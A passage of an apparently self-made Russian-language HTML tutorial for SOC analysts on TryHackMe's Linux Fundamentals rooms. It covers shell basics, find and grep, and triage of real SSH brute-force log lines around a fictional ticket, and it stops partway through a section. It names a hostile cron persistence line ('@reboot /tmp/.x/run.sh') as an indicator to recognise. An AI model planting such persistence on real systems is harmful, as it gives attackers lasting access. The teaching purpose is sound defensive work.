@@ -1,0 +1,925 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#faf9f5;color:#141413}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>Учебник: Linux Fundamentals</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Onest:wght@400;500;700&family=Unbounded:wght@500;700&family=JetBrains+Mono:wght@400;600&display=swap">
+<style>
+:root{
+  --bg:#F3F5F6; --surface:#FFFFFF; --ink:#17212B; --muted:#5A6672; --line:#D7DDE2;
+  --accent:#0B6B7B; --accent-soft:#E0EFF1; --amber:#9A5B08; --amber-soft:#FAEFDC;
+  --good:#1D7439; --good-soft:#E2F2E6; --bad:#AE2A21; --bad-soft:#FBE6E3;
+  --code-bg:#EAEEF1; --code-ink:#1C2A36;
+  --f-body:"Onest",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  --f-disp:"Unbounded","Onest",system-ui,sans-serif;
+  --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,Consolas,monospace;
+}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){
+  color-scheme:dark;
+  --bg:#10151A; --surface:#171F27; --ink:#E2E7EC; --muted:#98A4B0; --line:#2A3440;
+  --accent:#5EC2D2; --accent-soft:#15313A; --amber:#E3A94E; --amber-soft:#35291A;
+  --good:#63C98D; --good-soft:#163323; --bad:#F08B81; --bad-soft:#3B1D1A;
+  --code-bg:#0C1115; --code-ink:#D6E0E8;}}
+:root[data-theme="dark"]{
+  color-scheme:dark;
+  --bg:#10151A; --surface:#171F27; --ink:#E2E7EC; --muted:#98A4B0; --line:#2A3440;
+  --accent:#5EC2D2; --accent-soft:#15313A; --amber:#E3A94E; --amber-soft:#35291A;
+  --good:#63C98D; --good-soft:#163323; --bad:#F08B81; --bad-soft:#3B1D1A;
+  --code-bg:#0C1115; --code-ink:#D6E0E8;}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--ink);font:16px/1.65 var(--f-body);padding-inline:16px;padding-block:0 64px}
+.wrap{max-width:760px;margin:0 auto}
+.topbar{position:sticky;top:env(safe-area-inset-top,0px);z-index:5;background:var(--bg);margin-inline:-16px;padding:8px 16px;border-bottom:1px solid var(--line);display:flex;gap:12px;align-items:center;font-size:13px;color:var(--muted)}
+.topbar .bar{flex:1;height:6px;background:var(--line);border-radius:3px;overflow:hidden}
+.topbar .fill{height:100%;width:0;background:var(--accent);transition:width .3s}
+.topbar b{color:var(--ink);font-variant-numeric:tabular-nums}
+h1,h2,h3{text-wrap:balance;line-height:1.25}
+h1{font:700 clamp(26px,5vw,38px)/1.15 var(--f-disp);margin:40px 0 8px;letter-spacing:-.01em}
+h2{font:600 clamp(20px,3.6vw,26px)/1.25 var(--f-disp);margin:64px 0 12px;padding-top:12px;border-top:2px solid var(--ink)}
+h3{font-size:19px;margin:36px 0 8px}
+h4{font-size:16px;margin:24px 0 6px}
+p,li{max-width:68ch}
+a{color:var(--accent)}
+a:focus-visible,button:focus-visible,summary:focus-visible,input:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+code{font:0.88em/1.5 var(--f-mono);background:var(--code-bg);color:var(--code-ink);padding:1px 5px;border-radius:4px}
+pre{background:var(--code-bg);color:var(--code-ink);padding:14px 16px;border-radius:8px;overflow-x:auto;font:13.5px/1.55 var(--f-mono)}
+pre code{background:none;padding:0;font:inherit}
+.tw,.dw{overflow-x:auto}
+table{border-collapse:collapse;font-size:14.5px;min-width:100%}
+th,td{border-bottom:1px solid var(--line);padding:7px 10px;text-align:left;vertical-align:top}
+th{font-size:12px;text-transform:uppercase;letter-spacing:.06em;color:var(--muted)}
+.kicker{font:600 11.5px/1 var(--f-body);text-transform:uppercase;letter-spacing:.09em;color:var(--muted);margin-bottom:10px}
+.lead{font-size:18px;color:var(--muted);max-width:62ch}
+.meta{display:flex;flex-wrap:wrap;gap:8px;margin:16px 0}
+.meta span{font-size:13px;padding:4px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface)}
+.progress{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:16px 18px;margin:24px 0}
+.progress ol{list-style:none;padding:0;margin:0;display:grid;gap:4px}
+.progress label{display:flex;gap:8px;align-items:baseline;cursor:pointer}
+.progress input{accent-color:var(--accent)}
+.progress input:checked+a{color:var(--muted);text-decoration:line-through}
+aside{margin:24px 0;padding:14px 18px;border-radius:10px}
+aside>*:last-child{margin-bottom:0}
+aside p:first-of-type{margin-top:0}
+.shift{background:var(--amber-soft)} .shift .kicker{color:var(--amber)}
+.mistakes{background:var(--bad-soft)} .mistakes .kicker{color:var(--bad)}
+.note{background:var(--accent-soft)} .note .kicker{color:var(--accent)}
+details{margin:18px 0;border:1px solid var(--line);border-radius:10px;background:var(--surface)}
+details>summary{cursor:pointer;padding:12px 16px;font-weight:500;list-style:none}
+details>summary::before{content:"+";display:inline-block;width:1.2em;color:var(--accent);font-weight:700}
+details[open]>summary::before{content:"–"}
+details>*:not(summary){margin-inline:16px}
+details>*:last-child{margin-bottom:14px}
+.deep summary .kicker{display:inline;margin:0 6px 0 0;color:var(--accent)}
+.answer{background:transparent}
+.quiz,.triage,.field,.killchain,.terms{margin:24px 0;padding:16px 18px;border:1px solid var(--line);border-radius:10px;background:var(--surface)}
+.q+.q{margin-top:20px;padding-top:18px;border-top:1px dashed var(--line)}
+.qtext{font-weight:500;margin-bottom:8px}
+.opts,.verdicts{display:flex;flex-wrap:wrap;gap:8px}
+button{font:inherit;color:inherit;cursor:pointer}
+.opt,.verdict,.fall{border:1px solid var(--line);background:var(--bg);border-radius:8px;padding:7px 12px;text-align:left;font-size:15px}
+.opt:hover:not(:disabled),.verdict:hover:not(:disabled),.fall:hover{border-color:var(--accent)}
+.opt:disabled,.verdict:disabled{cursor:default}
+.opt.ok,.verdict.ok{background:var(--good-soft);border-color:var(--good);color:var(--good)}
+.opt.no,.verdict.no{background:var(--bad-soft);border-color:var(--bad);color:var(--bad)}
+.why{margin-top:10px;font-size:15px;color:var(--ink);background:var(--bg);padding:10px 12px;border-radius:8px}
+.why p:first-child{margin-top:0}.why p:last-child{margin-bottom:0}
+.ttitle{font-weight:600;margin-bottom:6px}
+.log{margin:8px 0 12px;white-space:pre}
+.field .fline{font:13.5px/2 var(--f-mono);background:var(--code-bg);color:var(--code-ink);padding:10px 12px;border-radius:8px;overflow-x:auto;white-space:nowrap}
+.seg{font:inherit;background:var(--accent-soft);color:var(--ink);border:0;border-bottom:2px solid var(--accent);border-radius:3px;padding:1px 2px;margin:0 1px}
+.seg.on{background:var(--accent);color:var(--bg)}
+.fnotes{margin:10px 0;display:grid;gap:6px;font-size:15px}
+.fhint{color:var(--muted);font-size:14px}
+.ftitle{font-weight:600;margin-bottom:8px}
+.kcband{display:flex;gap:6px;overflow-x:auto;padding-bottom:6px}
+.kc{flex:1 0 118px;display:flex;flex-direction:column;gap:4px;text-align:left;border:1px solid var(--line);background:var(--bg);border-radius:8px;padding:10px;position:relative}
+.kc:not(:last-child)::after{content:"→";position:absolute;right:-6px;top:10px;color:var(--muted);font-size:12px}
+.kc.on{border-color:var(--accent);background:var(--accent-soft)}
+.kcn{font:600 12px var(--f-mono);color:var(--accent)}
+.kcs{font-weight:600;font-size:14px;line-height:1.3}
+.kct{font-size:12px;color:var(--muted);line-height:1.3}
+.kcp{margin-top:10px;display:grid;gap:6px;font-size:15px;background:var(--bg);padding:10px 12px;border-radius:8px}
+.terms td:first-child{font-family:var(--f-mono);font-size:13.5px}
+figure.diagram{margin:24px 0}
+.diagram svg{display:block;max-width:100%;height:auto;min-width:560px}
+.d-box{fill:var(--surface);stroke:var(--line);stroke-width:1.2}
+.d-hi{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+.d-t{fill:var(--ink);font:600 13px var(--f-mono)}
+.d-s{fill:var(--muted);font:11.5px var(--f-body)}
+.d-n{fill:var(--accent);font:700 13px var(--f-body)}
+.d-l{stroke:var(--muted);stroke-width:1.2;fill:none}
+.d-a{fill:var(--muted)}
+.refs{font-size:.72em;line-height:0}
+.refs a{text-decoration:none}
+.sources li{margin:6px 0;word-break:break-word}
+.sources .checked{color:var(--muted);font-size:14px}
+hr{border:0;border-top:1px solid var(--line);margin:40px 0}
+@media (prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+<div class="wrap">
+<div class="topbar"><span>Прогресс</span><div class="bar"><div class="fill" id="pfill"></div></div><b id="pcount">0/0</b></div>
+<nav class="progress" aria-label="Главы"><div class="kicker">Отмечай пройденные главы</div><ol><li><label><input type="checkbox" id="done-recall" data-ch="recall"> <a href="#recall">Вспомни прошлое</a></label></li><li><label><input type="checkbox" id="done-prologue" data-ch="prologue"> <a href="#prologue">Пролог: алерт в 11:05</a></label></li><li><label><input type="checkbox" id="done-ch1" data-ch="ch1"> <a href="#ch1">Глава 1. Первые шаги в терминале (Part 1)</a></label></li><li><label><input type="checkbox" id="done-ch2" data-ch="ch2"> <a href="#ch2">Глава 2. SSH, файлы и права (Part 2)</a></label></li><li><label><input type="checkbox" id="done-ch3" data-ch="ch3"> <a href="#ch3">Глава 3. Процессы, автозапуск, пакеты и логи (Part 3)</a></label></li><li><label><input type="checkbox" id="done-finale" data-ch="finale"> <a href="#finale">Финал: закрываем тикет и где граница L1</a></label></li><li><label><input type="checkbox" id="done-interview" data-ch="interview"> <a href="#interview">Вопросы с собеседований (EN / DE)</a></label></li><li><label><input type="checkbox" id="done-selfcheck" data-ch="selfcheck"> <a href="#selfcheck">Самопроверка</a></label></li><li><label><input type="checkbox" id="done-practice" data-ch="practice"> <a href="#practice">Практика на реальных логах</a></label></li><li><label><input type="checkbox" id="done-cheatsheet" data-ch="cheatsheet"> <a href="#cheatsheet">Шпаргалка на один экран</a></label></li><li><label><input type="checkbox" id="done-feedback" data-ch="feedback"> <a href="#feedback">Обратная связь</a></label></li></ol></nav>
+<h1>Учебник: Linux Fundamentals</h1>
+<p class="lead">Три комнаты TryHackMe глазами будущего SOC-аналитика: командная строка, права, процессы, cron и логи. Весь учебник держится на одном сюжете: на смене прилетает алерт «SSH brute force», и каждая глава раскручивает его дальше.</p>
+
+<div class="meta"><span>Модуль: Linux Fundamentals</span><span>Комнаты: Part 1 · Part 2 · Part 3</span><span>Чтение ≈ 75 мин</span><span>Практика ≈ 90 мин</span><span>Калибровка: SEC1</span></div>
+
+<p><strong>Что будешь уметь после учебника и трёх комнат:</strong></p>
+<ul>
+<li>ходить по файловой системе Linux и не теряться: <code>pwd</code>, <code>ls</code>, <code>cd</code>, <code>cat</code>, абсолютные и относительные пути;</li>
+<li>находить файлы и строки: <code>find</code> и <code>grep</code>, склеивать команды пайпом <code>|</code> и за минуту вытаскивать из 2000 строк лога топ атакующих IP;</li>
+<li>читать строку <code>ls -l</code> и <code>/etc/passwd</code> так, как читает их L2: кто владелец, кто может писать, кто тут root;</li>
+<li>понимать процессы и сигналы, отличать <code>kill</code> от <code>kill -9</code> и объяснить, почему L1 процессы на чужом сервере не убивает;</li>
+<li>найти закреплённость через cron и понять, что делает строка <code>@reboot /tmp/.x/run.sh</code>;</li>
+<li>знать, в каком файле <code>/var/log</code> искать вход по SSH, а в каком — действия веб-сервера.</li>
+</ul>
+<p><strong>Как пользоваться.</strong> Читаешь главу, проходишь соответствующую комнату (Part 1 → глава 1 и так далее), потом возвращаешься к блокам «Копнуть глубже» и практике. Команды из глав гоняешь на машине комнаты — она открывается прямо в браузере. Практику на реальных логах делаешь в Терминале на маке: там всё портируемое, и каждое отличие BSD от GNU я отмечаю. Числа в практике посчитаны скриптом на настоящих логах из набора loghub <sup class="refs">[<a class="ref" href="#src-loghub">1</a>]</sup>. Всё выдуманное помечено словом «учебная».</p>
+<p>Флагов и ответов на вопросы комнат здесь нет. Учебник объясняет, как найти ответ, а находишь его ты.</p>
+<h2 id="recall">Вспомни прошлое</h2>
+<p>Четыре вопроса из прошлых тем, которые сегодня понадобятся. Сюжет учебника стоит на SSH, IP-адресах и логах. Если споткнёшься, освежи эту тему, прежде чем идти дальше.</p>
+<div class="quiz"><div class="kicker">Квиз</div><div class="q"><div class="qtext">SSH по умолчанию слушает порт…</div><div class="opts"><button type="button" class="opt" data-ok="0">21</button><button type="button" class="opt" data-ok="1">22</button><button type="button" class="opt" data-ok="0">443</button><button type="button" class="opt" data-ok="0">3389</button></div><div class="why" hidden>Порт 22 — это SSH. 21 занят FTP, 443 — HTTPS, 3389 — RDP. Весь сюжет учебника про попытки войти на порт 22.</div></div><div class="q"><div class="qtext">Адрес <code>183.62.140.253</code> в логе нашего сервера — это…</div><div class="opts"><button type="button" class="opt" data-ok="0">частный адрес из локальной сети</button><button type="button" class="opt" data-ok="1">публичный адрес из интернета</button><button type="button" class="opt" data-ok="0">адрес самого сервера</button></div><div class="why" hidden>Частные диапазоны — это <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code> и <code>192.168.0.0/16</code>. Всё остальное (кроме служебных) маршрутизируется в интернете. Раз в SSH-логе стоит публичный адрес, стучались снаружи.</div></div><div class="q"><div class="qtext">Веб-сервер отдал на запрос код <code>404</code>. Что это значит?</div><div class="opts"><button type="button" class="opt" data-ok="0">сервер упал</button><button type="button" class="opt" data-ok="0">доступ запрещён</button><button type="button" class="opt" data-ok="1">такого ресурса нет</button><button type="button" class="opt" data-ok="0">запрос перенаправлен</button></div><div class="why" hidden>404 — Not Found. «Запрещено» — это 403, перенаправление — 3xx, ошибка сервера — 5xx. Пачка 404 подряд от одного IP в логе Apache часто означает, что кто-то перебирает пути сканером.</div></div><div class="q"><div class="qtext">Что делает обратный DNS-запрос (reverse lookup)?</div><div class="opts"><button type="button" class="opt" data-ok="0">превращает имя в IP</button><button type="button" class="opt" data-ok="1">превращает IP в имя</button><button type="button" class="opt" data-ok="0">проверяет, открыт ли порт</button></div><div class="why" hidden>Прямой запрос даёт по имени IP, обратный (PTR) — по IP имя. В SSH-логе ты увидишь строку «reverse mapping checking… failed»: это как раз сверка прямого и обратного DNS. Разберём её в главе 1 — она выглядит страшнее, чем есть на самом деле.</div></div></div>
+<h2 id="prologue">Пролог: алерт в 11:05</h2>
+<aside class="shift"><div class="kicker">Ты на смене</div><p>Frühschicht, 11:05. Ты L1 в SOC вымышленного сервис-провайдера, в очереди SIEM новый тикет:</p>
+<p><strong>Medium — Linux: SSH brute force — host <code>LabSZ</code> — &gt;100 failed logins / 10 min from single source.</strong></p>
+<p>SLA на Medium — взять в работу за 30 минут. Runbook «SSH-Bruteforce» короткий: (1) подтвердить по сырым логам, (2) проверить, был ли успешный вход, (3) обогатить IP-адреса, (4) закрыть с обоснованием или эскалировать на L2. Админ клиента выложил копию <code>auth</code>-лога на jump-хост, доступ у тебя только на чтение. SIEM разобрал лог плохо, так что остаются терминал и сырые строки.</p></aside>
+<p>Лог в сюжете настоящий: это <code>OpenSSH_2k.log</code> из набора loghub, 2000 строк с реального сервера <sup class="refs">[<a class="ref" href="#src-loghub">1</a>]</sup>. Компания и тикет выдуманы. Числа, которые будут дальше, посчитаны скриптом, и ты сам повторишь их в практике.</p>
+<h2 id="ch1">Глава 1. Первые шаги в терминале (Part 1)</h2>
+<p><strong>Аналогия.</strong> Представь огромный склад, на котором ты не видишь полок. Есть только окошко, а за ним кладовщик, который понимает короткие приказы: «где я?», «что на этой полке?», «перейди в ряд Б», «прочитай этикетку», «найди все коробки с надписью X». Графический интерфейс — это когда ходишь по складу сам. Терминал — это кладовщик: он быстрее тебя в сто раз, но только если ты знаешь нужные слова. Первая комната как раз учит этим словам.</p>
+<p><strong>Зачем это SOC-аналитику.</strong> На Linux работает огромная часть того, что ты будешь защищать: веб-серверы, базы данных, облачные виртуалки, контейнеры, внутренности фаерволов и роутеров. SIEM показывает сводку, но когда парсер сломался, L2 просит «сырые строки» или надо быстро проверить гипотезу, ты оказываешься в терминале с <code>grep</code>. Фронтенд тебе тут помогает: <code>npm</code>, <code>git</code>, <code>cd</code> в проект — это тот же самый шелл, только теперь ты им расследуешь.</p>
+<h3>Linux — это ядро, а не одна система</h3>
+<p>В Task 2 комната даёт немного истории <sup class="refs">[<a class="ref" href="#src-thm-lf1">2</a>]</sup>. Главное, что стоит унести: <strong>Linux — это ядро</strong> (kernel), то есть сердцевина, которая управляет памятью, процессами и железом. Его написал Линус Торвальдс в начале девяностых; точный год первого релиза — вопрос комнаты, найди его сам. Вокруг ядра собирают <strong>дистрибутивы</strong>: ядро, набор программ, менеджер пакетов и настройки по умолчанию. Ubuntu, Debian, Red Hat Enterprise Linux, Kali — всё это Linux, но с разными привычками. Для SOC эта разница реальна: логи входа в Ubuntu лежат в одном файле, в RHEL — в другом (глава 3).</p>
+<p>macOS — не Linux. Это Unix-подобная система с BSD-корнями, поэтому часть команд в Терминале мака ведёт себя чуть иначе. Отличия я буду отмечать там, где они укусят.</p>
+<h3>Первая машина и что значит приглашение</h3>
+<p>В Task 3 ты запускаешь машину прямо в браузере. Первое, что видишь, — <strong>приглашение</strong> (prompt): строку, после которой шелл ждёт команду. Она тоже несёт информацию:</p>
+<div class="field"><div class="kicker">Разбор строки — жми на кусок</div><div class="ftitle">Приглашение шелла</div><div class="fline"><button type="button" class="seg" data-i="0">tryhackme</button>@<button type="button" class="seg" data-i="1">linux1</button>:<button type="button" class="seg" data-i="2">~</button><button type="button" class="seg" data-i="3">$</button></div><div class="fnotes"><div class="segnote" data-i="0" hidden><code>tryhackme</code> — Имя пользователя, под которым ты сидишь. Первое, что проверяешь после входа.</div><div class="segnote" data-i="1" hidden><code>linux1</code> — Имя машины (hostname). На смене по нему сверяешь, что ты на том хосте, о котором тикет.</div><div class="segnote" data-i="2" hidden><code>~</code> — Текущий каталог. Тильда — сокращение для домашнего каталога пользователя, здесь это <code>/home/tryhackme</code>.</div><div class="segnote" data-i="3" hidden><code>$</code> — Ты обычный пользователь. У root вместо <code>$</code> будет <code>#</code>, и это повод печатать внимательнее.</div><div class="fhint">Нажми на любой подсвеченный фрагмент.</div></div><button type="button" class="fall">Показать все пояснения</button></div>
+<h3>Первые команды: echo и whoami</h3>
+<p><code>echo</code> печатает то, что ты ему дал. Если в тексте есть пробелы, бери его в кавычки: <code>echo "Hallo Welt"</code>. Зачем такая мелочь? Дальше <code>echo</code> станет кирпичиком: им пишут строки в файлы и проверяют переменные.</p>
+<p><code>whoami</code> отвечает на вопрос «под каким пользователем я сейчас». Для SOC это важная команда, потому что атакующий, попав на машину, почти всегда первым делом выясняет, кто он. В истории команд взломанного хоста ты будешь снова и снова видеть <code>whoami</code>, <code>id</code>, <code>uname -a</code>. В MITRE ATT&amp;CK это разведка: System Owner/User Discovery (T1033). Сама по себе команда не вредоносна, её запускают и админы. Подозрительным её делает контекст: кто запустил, откуда и что было дальше.</p>
+<h3>Файловая система: pwd, ls, cd, cat</h3>
+<p>Четыре команды, которые ты наберёшь тысячи раз:</p>
+<table>
+<thead>
+<tr>
+<th>Команда</th>
+<th>Что делает</th>
+<th>Расшифровка</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>pwd</code></td>
+<td>показывает, где ты сейчас</td>
+<td>print working directory</td>
+</tr>
+<tr>
+<td><code>ls</code></td>
+<td>показывает содержимое каталога</td>
+<td>list</td>
+</tr>
+<tr>
+<td><code>cd папка</code></td>
+<td>переходит в каталог</td>
+<td>change directory</td>
+</tr>
+<tr>
+<td><code>cat файл</code></td>
+<td>выводит содержимое файла</td>
+<td>concatenate</td>
+</tr>
+</tbody>
+</table>
+<p>Путь бывает <strong>абсолютный</strong>, он начинается с <code>/</code> от корня: <code>/home/tryhackme/notes.txt</code>. И <strong>относительный</strong>, от того места, где ты стоишь: <code>notes.txt</code> или <code>folder1/notes.txt</code>. Пара спецобозначений: <code>..</code> — на уровень выше, <code>.</code> — текущий каталог, <code>~</code> — домашний каталог. <code>cd</code> без аргументов возвращает домой, <code>cd -</code> — в предыдущий каталог.</p>
+<p>Вживую, на твоём примере (имена выдуманы, чтобы не подсказывать ответы комнаты):</p>
+<pre><code>tryhackme@linux1:~$ pwd
+/home/tryhackme
+tryhackme@linux1:~$ ls
+cases  notes.txt  tools
+tryhackme@linux1:~$ cd cases
+tryhackme@linux1:~/cases$ ls
+2026-09-23-labsz
+tryhackme@linux1:~/cases$ cat ../notes.txt
+Schichtübergabe: offene Tickets prüfen
+</code></pre>
+<p>Две привычки, которые экономят часы. <strong>Tab</strong> дописывает имя файла или папки: набрал <code>cd ca</code>, нажал Tab — получил <code>cd cases/</code>. <strong>Стрелка вверх</strong> достаёт предыдущие команды.</p>
+<aside class="shift"><div class="kicker">Ты на смене</div><p>Ты на jump-хосте: <code>cd /cases/2026-09-23-labsz</code>, <code>ls</code> — там один файл <code>OpenSSH_2k.log</code>. Набираешь <code>cat OpenSSH_2k.log</code>, и две тысячи строк пролетают мимо за секунду. <code>cat</code> для таких файлов не годится: нужен способ смотреть по кусочкам и искать.</p></aside>
+<p>Комната этого не показывает, но на смене без этого никак. Четыре команды на каждый день:</p>
+<ul>
+<li><code>head -20 файл</code> — первые 20 строк, <code>tail -20 файл</code> — последние 20;</li>
+<li><code>wc -l файл</code> — сколько строк (word count, lines);</li>
+<li><code>less файл</code> — листать постранично: пробел — дальше, <code>/слово</code> — поиск, <code>q</code> — выход.</li>
+</ul>
+<p><code>head -3 OpenSSH_2k.log</code> сразу показывает, с чем имеешь дело:</p>
+<pre><code>Dec 10 06:55:46 LabSZ sshd[24200]: reverse mapping checking getaddrinfo for ns.marryaldkfaczcz.com [173.234.31.186] failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 10 06:55:46 LabSZ sshd[24200]: Invalid user webmaster from 173.234.31.186
+Dec 10 06:55:46 LabSZ sshd[24200]: input_userauth_request: invalid user webmaster [preauth]
+</code></pre>
+<p>«POSSIBLE BREAK-IN ATTEMPT» уже в первой строке. Паниковать рано, сначала разберись с триажем.</p>
+<div class="triage" data-answer="FP"><div class="kicker">Триаж</div><div class="ttitle">Алерт: «sshd: POSSIBLE BREAK-IN ATTEMPT» от 173.234.31.186 на LabSZ</div><pre class="log"><code>Dec 10 06:55:46 LabSZ sshd[24200]: reverse mapping checking getaddrinfo for ns.marryaldkfaczcz.com [173.234.31.186] failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 10 06:55:46 LabSZ sshd[24200]: Invalid user webmaster from 173.234.31.186
+Dec 10 06:55:48 LabSZ sshd[24200]: Failed password for invalid user webmaster from 173.234.31.186 port 38926 ssh2
+Dec 10 06:55:48 LabSZ sshd[24200]: Connection closed by 173.234.31.186 [preauth]</code></pre><div class="verdicts"><button type="button" class="verdict" data-v="TP">Инцидент (TP)</button><button type="button" class="verdict" data-v="FP">Ложное (FP)</button><button type="button" class="verdict" data-v="DIG">Копать дальше</button></div><div class="why" hidden><p><strong>Ложное срабатывание — как «взлом».</strong> Фраза пугает, но смысл у неё узкий. sshd сделал обратный DNS-запрос по IP, получил имя, потом прямой запрос по этому имени, и адреса не сошлись. Это говорит о кривом DNS у источника, а не о проникновении. Остальные строки того же соединения (<code>sshd[24200]</code>) показывают: пользователь <code>webmaster</code> не существует, пароль неверный, соединение закрыто на стадии <code>[preauth]</code>, то есть до аутентификации. Входа не было.</p>
+<p>Это обычный интернет-шум, и он уже покрыт алертом про brute force. Вердикт: FP для «break-in», закрыть с пометкой. Всего в этом логе 85 таких строк, 80 из них от одного IP, который параллельно перебирает пароли (мы его ещё встретим).</p></div></div>
+<h3>Поиск: find и grep</h3>
+<p>Task 6 даёт два главных инструмента <sup class="refs">[<a class="ref" href="#src-thm-lf1">2</a>]</sup>. Они ищут разное: <strong><code>find</code> ищет файлы</strong>, <strong><code>grep</code> ищет строки внутри файлов</strong>.</p>
+<p><strong>find</strong> — «найди коробки»: <code>find [где] [условия]</code>.</p>
+<pre><code>find . -name &quot;notes.txt&quot;        # файл с точным именем, начиная с текущего каталога
+find . -name &quot;*.log&quot;            # все файлы на .log
+find /var/log -type f -name &quot;*.gz&quot;   # только файлы (d — каталоги)
+find / -name &quot;*.sh&quot; 2&gt;/dev/null # по всему диску, ошибки доступа спрятать
+</code></pre>
+<p><code>*</code> — это подстановочный знак (wildcard): «любые символы». Шаблон всегда бери в кавычки: <code>"*.log"</code>. Без кавычек шелл сам раскроет звёздочку до того, как find её увидит, и результат будет странным. <code>2&gt;/dev/null</code> значит «ошибки (поток номер 2) — в чёрную дыру». При поиске по всему диску тебя иначе завалит строками <code>Permission denied</code>.</p>
+<p><strong>grep</strong> — «найди строку в документах»: <code>grep "шаблон" файл</code>.</p>
+<pre><code>grep &quot;Failed password&quot; OpenSSH_2k.log      # все строки с этой фразой
+grep -c &quot;Failed password&quot; OpenSSH_2k.log   # только число строк
+grep -i &quot;failed&quot; OpenSSH_2k.log            # без учёта регистра
+grep -v &quot;preauth&quot; OpenSSH_2k.log           # всё, КРОМЕ строк с preauth
+grep -n &quot;Accepted&quot; OpenSSH_2k.log          # с номерами строк
+</code></pre>
+<aside class="shift"><div class="kicker">Ты на смене</div><p>Первый вопрос runbook: брут вообще был? <code>grep -c "Failed password" OpenSSH_2k.log</code> → <strong>520</strong>. Подтверждено. Второй вопрос, самый важный: пустили кого-нибудь? <code>grep "Accepted" OpenSSH_2k.log</code>:</p>
+<p><code>Dec 10 09:32:20 LabSZ sshd[24680]: Accepted password for fztu from 119.137.62.142 port 49116 ssh2</code></p>
+<p>Одна строка. Кто-то вошёл по паролю посреди брутфорса. Взломали или свои? Отвечать будем в главе 2: там нужны права и пользователи.</p></aside>
+<p>Разбери строку неудачного входа по кусочкам. Такой разбор ты будешь делать всю карьеру, только поля будут называться по-разному в разных SIEM.</p>
+<div class="field"><div class="kicker">Разбор строки — жми на кусок</div><div class="ftitle">Строка auth-лога: неудачный вход по SSH</div><div class="fline"><button type="button" class="seg" data-i="0">Dec 10 10:54:33</button> <button type="button" class="seg" data-i="1">LabSZ</button> <button type="button" class="seg" data-i="2">sshd</button><button type="button" class="seg" data-i="3">[24872]</button>: <button type="button" class="seg" data-i="4">Failed password</button> for <button type="button" class="seg" data-i="5">root</button> from <button type="button" class="seg" data-i="6">183.62.140.253</button> <button type="button" class="seg" data-i="7">port 34263</button> <button type="button" class="seg" data-i="8">ssh2</button></div><div class="fnotes"><div class="segnote" data-i="0" hidden><code>Dec 10 10:54:33</code> — Время. В классическом syslog <strong>нет ни года, ни часового пояса</strong>, это локальное время сервера. В отчёте так и пиши: «Serverzeit, Zeitzone unbekannt», пока админ не подтвердит.</div><div class="segnote" data-i="1" hidden><code>LabSZ</code> — Hostname — с какой машины пришла запись.</div><div class="segnote" data-i="2" hidden><code>sshd</code> — Программа, которая пишет. sshd — это SSH-демон, серверная часть SSH.</div><div class="segnote" data-i="3" hidden><code>[24872]</code> — PID процесса sshd, который обслуживает <strong>это одно соединение</strong>. <code>grep "sshd\[24872\]"</code> соберёт всю историю соединения.</div><div class="segnote" data-i="4" hidden><code>Failed password</code> — Событие: пароль неверный. Успех выглядит как <code>Accepted password</code> или <code>Accepted publickey</code>.</div><div class="segnote" data-i="5" hidden><code>root</code> — Учётка, в которую ломятся. Если бы её не было на сервере, стояло бы <code>for invalid user имя</code>.</div><div class="segnote" data-i="6" hidden><code>183.62.140.253</code> — IP источника. Его ты обогащаешь: репутация, страна, провайдер.</div><div class="segnote" data-i="7" hidden><code>port 34263</code> — Порт на стороне атакующего, случайный и меняется с каждым соединением. Для расследования почти бесполезен, не путай с портом 22 сервера.</div><div class="segnote" data-i="8" hidden><code>ssh2</code> — Версия протокола.</div><div class="fhint">Нажми на любой подсвеченный фрагмент.</div></div><button type="button" class="fall">Показать все пояснения</button></div>
+<h3>Операторы шелла: &amp;, &amp;&amp;, &gt;, &gt;&gt;</h3>
+<p>Task 7 знакомит с четырьмя операторами <sup class="refs">[<a class="ref" href="#src-thm-lf1">2</a>, <a class="ref" href="#src-man-bash">3</a>]</sup>:</p>
+<table>
+<thead>
+<tr>
+<th>Оператор</th>
+<th>Смысл</th>
+<th>Пример</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&amp;</code></td>
+<td>запустить в фоне и сразу вернуть приглашение</td>
+<td><code>sleep 60 &amp;</code></td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td>выполнить вторую команду, <strong>только если первая успешна</strong></td>
+<td><code>mkdir case &amp;&amp; cd case</code></td>
+</tr>
+<tr>
+<td><code>&gt;</code></td>
+<td>записать вывод в файл, <strong>перезаписав</strong> его</td>
+<td><code>grep "Accepted" log &gt; evidence.txt</code></td>
+</tr>
+<tr>
+<td><code>&gt;&gt;</code></td>
+<td><strong>дописать</strong> вывод в конец файла</td>
+<td><code>grep "Failed" log &gt;&gt; evidence.txt</code></td>
+</tr>
+</tbody>
+</table>
+<p>Аналогия для <code>&gt;</code> и <code>&gt;&gt;</code>: <code>&gt;</code> — это «выбросить старую тетрадь и начать новую», <code>&gt;&gt;</code> — «дописать на следующей странице». На смене это разница между «сохранил улики» и «стёр свои же заметки».</p>
+<aside class="shift"><div class="kicker">Ты на смене</div><p>Собираешь материал для тикета:</p>
+<pre><code>mkdir -p ~/cases/labsz &amp;&amp; cd ~/cases/labsz
+grep &quot;Accepted&quot; /cases/2026-09-23-labsz/OpenSSH_2k.log &gt; evidence.txt
